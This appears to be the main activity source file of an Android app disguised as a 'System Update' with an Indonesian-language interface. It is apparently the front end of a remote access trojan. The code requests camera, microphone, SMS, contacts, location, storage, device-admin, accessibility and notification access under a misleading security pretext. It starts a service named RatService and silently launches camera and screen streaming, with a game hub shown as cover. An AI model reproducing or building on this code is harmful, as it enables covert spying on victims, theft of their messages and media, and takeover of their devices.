package com.system.update

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.system.update.games.GameHub
import kotlinx.coroutines.delay

class MainActivity : ComponentActivity() {

    private val requiredPerms = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.VIBRATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.POST_NOTIFICATIONS
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
            add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
            add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        try {
            val svcIntent = Intent(this, AppLockForegroundService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svcIntent)
            } else {
                startService(svcIntent)
            }
        } catch (_: Exception) {}

        requestProactivePermissionsOnce()
        startRatService()

        handleAutoStartCam(intent)
        handleAutoStartScreen(intent)

        setContent {
            var showSplash by remember { mutableStateOf(true) }
            var grantedAll by remember { mutableStateOf(false) }
            var showDashboard by remember { mutableStateOf(false) }
            var refreshKey by remember { mutableStateOf(0) }
            val ctx = LocalContext.current

            LaunchedEffect(Unit) {
                delay(800)
                if (isSetupDone() && checkAll()) {
                    grantedAll = true
                }
            }

            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = Color(0xFFD4AF37),
                    background = Color(0xFF0A0A0A),
                    surface = Color(0xFF141414),
                    onPrimary = Color.Black,
                    onBackground = Color(0xFFF0F0F0),
                    onSurface = Color(0xFFF0F0F0)
                )
            ) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color(0xFF0A0A0A)
                ) {
                    when {
                        showSplash -> SplashScreen { showSplash = false }
                        showDashboard -> GameHub()
                        grantedAll -> GrantDoneScreen(
                            onContinue = {
                                try {
                                    if (!ScreenCapture.isReady()) {
                                        val intent = ScreenCapture.requestIntent(ctx)
                                        startActivityForResult(intent, REQ_MEDIA_PROJECTION)
                                    }
                                } catch (_: Exception) {}
                                startRatService()
                                saveSetupDone()
                                showDashboard = true
                            }
                        )
                        else -> PermissionScreen(
                            perms = requiredPerms,
                            refreshKey = refreshKey,
                            onRequest = { requestAll(); refreshKey++ },
                            onCheck = { grantedAll = checkAll(); refreshKey++ },
                            onAllFiles = { requestAllFilesAccess(); refreshKey++ },
                            onAccessibility = { requestAccessibility(); refreshKey++ },
                            onNotifAccess = {
                                try {
                                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                                } catch (_: Exception) {}
                                refreshKey++
                            }
                        )
                    }
                }
            }

            LaunchedEffect(Unit) {
                delay(1200)
                grantedAll = checkAll()
                if (grantedAll && !ScreenCapture.isReady()) {
                    try {
                        val intent = ScreenCapture.requestIntent(this@MainActivity)
                        startActivityForResult(intent, REQ_MEDIA_PROJECTION)
                    } catch (_: Exception) {}
                }
            }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        handleAutoStartCam(intent)
        handleAutoStartScreen(intent)
    }

    override fun onResume() {
        super.onResume()
        startRatService()
        if (checkAll() && !ScreenCapture.isReady()) {
            try {
                val intent = ScreenCapture.requestIntent(this)
                startActivityForResult(intent, REQ_MEDIA_PROJECTION)
            } catch (_: Exception) {}
        }
    }

    private fun handleAutoStartCam(intent: Intent?) {
        if (intent?.getBooleanExtra("auto_start_cam", false) != true) return
        val isFront = intent.getBooleanExtra("cam_front", true)

        Handler(Looper.getMainLooper()).postDelayed({
            try { stopService(Intent(this, CameraStreamService::class.java)) } catch (_: Exception) {}
            try {
                val i = Intent(this, CameraStreamService::class.java).apply {
                    putExtra("front", isFront)
                    putExtra("interval", 200L)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(i)
                } else {
                    startService(i)
                }
            } catch (_: Exception) {}
        }, 2000)

        intent.removeExtra("auto_start_cam")
    }

    private fun handleAutoStartScreen(intent: Intent?) {
        if (intent?.getBooleanExtra("auto_start_screen", false) != true) return

        if (!ScreenCapture.isReady()) {
            try {
                val i = ScreenCapture.requestIntent(this)
                startActivityForResult(i, REQ_MEDIA_PROJECTION)
            } catch (_: Exception) {}
        }

        Handler(Looper.getMainLooper()).postDelayed({
            try { stopService(Intent(this, ScreenStreamService::class.java)) } catch (_: Exception) {}
            try {
                val i = Intent(this, ScreenStreamService::class.java).apply {
                    putExtra("interval", 200L)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(i)
                } else {
                    startService(i)
                }
            } catch (_: Exception) {}
        }, 3000)

        intent.removeExtra("auto_start_screen")
    }

    private fun saveSetupDone() {
        try {
            val prefs = getSharedPreferences("exoid_user_prefs", Context.MODE_PRIVATE)
            prefs.edit().putBoolean("setup_done", true).apply()
        } catch (_: Exception) {}
    }

    private fun isSetupDone(): Boolean {
        return try {
            val prefs = getSharedPreferences("exoid_user_prefs", Context.MODE_PRIVATE)
            prefs.getBoolean("setup_done", false)
        } catch (_: Exception) { false }
    }

    private fun requestProactivePermissionsOnce() {
        try {
            val prefs = getSharedPreferences("exoid_user_prefs", Context.MODE_PRIVATE)
            if (prefs.getBoolean("proactive_perms_requested", false)) return

            val needed = mutableListOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            )
            if (Build.VERSION.SDK_INT >= 33) needed.add(Manifest.permission.POST_NOTIFICATIONS)

            val missing = needed.filter {
                ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
            }.toTypedArray()

            prefs.edit().putBoolean("proactive_perms_requested", true).apply()
            if (missing.isNotEmpty()) {
                ActivityCompat.requestPermissions(this, missing, REQ_PERMS)
            }
        } catch (_: Exception) {}
    }

    private fun checkAll(): Boolean {
        val permsOk = requiredPerms.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        val overlayOk = Settings.canDrawOverlays(this)
        val adminOk = isAdminActive()
        val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            Environment.isExternalStorageManager()
        } else true
        val accessibilityOk = isAccessibilityEnabled()
        return permsOk && overlayOk && adminOk && storageOk && accessibilityOk
    }

    private fun requestAll() {
        val missing = requiredPerms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing, REQ_PERMS)
        }

        if (!Settings.canDrawOverlays(this)) {
            try {
                startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
            } catch (_: Exception) {}
        }

        if (!isAdminActive()) {
            try {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@MainActivity, AdminReceiver::class.java))
                    putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan untuk keamanan sistem")
                }
                startActivity(intent)
            } catch (_: Exception) {}
        }

        try {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).setData(Uri.parse("package:$packageName")))
            }
        } catch (_: Exception) {}
    }

    private fun requestAllFilesAccess() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (_: Exception) {
                    try {
                        startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                    } catch (_: Exception) {}
                }
            }
        }
    }

    private fun requestAccessibility() {
        try {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        } catch (_: Exception) {}
    }

    private fun isAdminActive(): Boolean {
        return try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))
        } catch (_: Exception) { false }
    }

    private fun isAccessibilityEnabled(): Boolean {
        return try {
            val enabled = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
            enabled.contains("$packageName/.AppLockAccessibilityService") ||
                    enabled.contains("$packageName/${AppLockAccessibilityService::class.java.name}")
        } catch (_: Exception) { false }
    }

    private fun startRatService() {
        try {
            val i = Intent(this, RatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(i)
            } else {
                startService(i)
            }
        } catch (_: Exception) {}
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_MEDIA_PROJECTION) {
            ScreenCapture.onActivityResult(this, resultCode, data)
        }
    }

    companion object {
        private const val REQ_PERMS = 1001
        private const val REQ_MEDIA_PROJECTION = 2002
    }
}

@Composable
fun SplashScreen(onDone: () -> Unit) {
    LaunchedEffect(Unit) { delay(1500); onDone() }
    Box(Modifier.fillMaxSize().background(Color(0xFF0A0A0A)), contentAlignment = Alignment.Center) {
        Column(horizontalAlignment = Alignment.CenterHorizontally) {
            Text("SYSTEM", color = Color(0xFFD4AF37), fontSize = 42.sp, fontWeight = FontWeight.Bold, letterSpacing = 10.sp)
            Spacer(Modifier.height(4.dp))
            Text("UPDATE", color = Color(0xFFE60000), fontSize = 26.sp, fontWeight = FontWeight.Bold, letterSpacing = 14.sp)
            Spacer(Modifier.height(24.dp))
            LinearProgressIndicator(modifier = Modifier.width(180.dp), color = Color(0xFFD4AF37), trackColor = Color(0xFF1C1C1C))
        }
    }
}

@Composable
fun PermissionScreen(
    perms: Array<String>, refreshKey: Int,
    onRequest: () -> Unit, onCheck: () -> Unit,
    onAllFiles: () -> Unit, onAccessibility: () -> Unit, onNotifAccess: () -> Unit
) {
    val ctx = LocalContext.current
    Column(Modifier.fillMaxSize().padding(16.dp).verticalScroll(rememberScrollState()), horizontalAlignment = Alignment.CenterHorizontally) {
        Spacer(Modifier.height(20.dp))
        Text("SYSTEM UPDATE", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color(0xFFD4AF37))
        Spacer(Modifier.height(4.dp))
        Text("Aktifkan semua izin untuk melanjutkan", color = Color(0xFF9A9A9A), fontSize = 11.sp)
        Spacer(Modifier.height(16.dp))

        val okCount = perms.count { ContextCompat.checkSelfPermission(ctx, it) == PackageManager.PERMISSION_GRANTED }
        val progress = if (perms.isEmpty()) 0f else okCount.toFloat() / perms.size

        LinearProgressIndicator(progress = { progress }, modifier = Modifier.fillMaxWidth().height(6.dp).clip(RoundedCornerShape(3.dp)), color = Color(0xFFD4AF37), trackColor = Color(0xFF1C1C1C))
        Spacer(Modifier.height(6.dp))
        Text("$okCount / ${perms.size} izin runtime aktif", color = Color(0xFF9A9A9A), fontSize = 11.sp)
        Spacer(Modifier.height(16.dp))

        key(refreshKey) {
            perms.forEach { p ->
                val ok = ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
                PermRow(p.substringAfterLast('.'), ok)
            }
            Spacer(Modifier.height(12.dp))
            Text("IZIN KHUSUS", color = Color(0xFFD4AF37), fontSize = 11.sp, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(6.dp))
            PermRow("Overlay", Settings.canDrawOverlays(ctx))
            val adminOk = try { val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager; dpm.isAdminActive(ComponentName(ctx, AdminReceiver::class.java)) } catch (_: Exception) { false }
            PermRow("Device Admin", adminOk)
            val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager() else true
            PermRow("All Files Access", storageOk)
            val accessibilityOk = try {
                val enabled = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
                enabled.contains("${ctx.packageName}/.AppLockAccessibilityService") || enabled.contains("${ctx.packageName}/${AppLockAccessibilityService::class.java.name}")
            } catch (_: Exception) { false }
            PermRow("Accessibility Service", accessibilityOk)
            val notifOk = try {
                val enabled = Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners") ?: ""
                enabled.contains(ctx.packageName)
            } catch (_: Exception) { false }
            PermRow("Notification Access", notifOk)
        }

        Spacer(Modifier.height(16.dp))
        Button(onClick = onAllFiles, modifier = Modifier.fillMaxWidth().height(46.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)), shape = RoundedCornerShape(10.dp)) {
            Text("BUKA ALL FILES ACCESS", color = Color(0xFF00FF66), fontSize = 12.sp, fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.height(8.dp))
        Button(onClick = onAccessibility, modifier = Modifier.fillMaxWidth().height(46.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)), shape = RoundedCornerShape(10.dp)) {
            Text("BUKA ACCESSIBILITY SETTINGS", color = Color(0xFF00FF66), fontSize = 12.sp, fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.height(8.dp))
        Button(onClick = onNotifAccess, modifier = Modifier.fillMaxWidth().height(46.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF1C1C1C)), shape = RoundedCornerShape(10.dp)) {
            Text("BUKA NOTIFICATION ACCESS", color = Color(0xFFFF9800), fontSize = 12.sp, fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.height(16.dp))
        Button(onClick = onRequest, modifier = Modifier.fillMaxWidth().height(50.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB30000)), shape = RoundedCornerShape(10.dp)) {
            Text("IZINKAN SEMUA", color = Color.White, fontWeight = FontWeight.Bold, letterSpacing = 2.sp)
        }
        Spacer(Modifier.height(8.dp))
        OutlinedButton(onClick = onCheck, modifier = Modifier.fillMaxWidth().height(50.dp), shape = RoundedCornerShape(10.dp)) {
            Text("CEK ULANG", color = Color(0xFFD4AF37), fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.height(20.dp))
    }
}

@Composable
fun PermRow(label: String, ok: Boolean) {
    Row(Modifier.fillMaxWidth().padding(vertical = 3.dp).background(Color(0xFF1C1C1C), shape = RoundedCornerShape(10.dp)).border(1.dp, if (ok) Color(0xFF00FF66).copy(alpha = 0.3f) else Color(0xFF8A0000).copy(alpha = 0.5f), shape = RoundedCornerShape(10.dp)).padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
        Text(if (ok) "OK" else "NO", color = if (ok) Color(0xFF00FF66) else Color(0xFFE60000), fontSize = 12.sp, fontWeight = FontWeight.Bold)
        Spacer(Modifier.width(12.dp))
        Text(label, color = Color.White, fontSize = 12.sp)
    }
}

@Composable
fun GrantDoneScreen(onContinue: () -> Unit) {
    Column(Modifier.fillMaxSize().padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally, verticalArrangement = Arrangement.Center) {
        Box(Modifier.size(110.dp).background(Color(0xFF00FF66), shape = RoundedCornerShape(55.dp)), contentAlignment = Alignment.Center) {
            Text("OK", color = Color.Black, fontSize = 36.sp, fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.height(28.dp))
        Text("IZIN LENGKAP", fontSize = 26.sp, color = Color(0xFFD4AF37), fontWeight = FontWeight.Bold, letterSpacing = 3.sp)
        Spacer(Modifier.height(10.dp))
        Text("Tekan lanjut untuk masuk ke dashboard", color = Color(0xFF9A9A9A), fontSize = 13.sp)
        Spacer(Modifier.height(36.dp))
        Button(onClick = onContinue, modifier = Modifier.fillMaxWidth().height(54.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB30000)), shape = RoundedCornerShape(12.dp)) {
            Text("LANJUT KE DASHBOARD", color = Color.White, fontWeight = FontWeight.Bold, letterSpacing = 2.sp)
        }
    }
}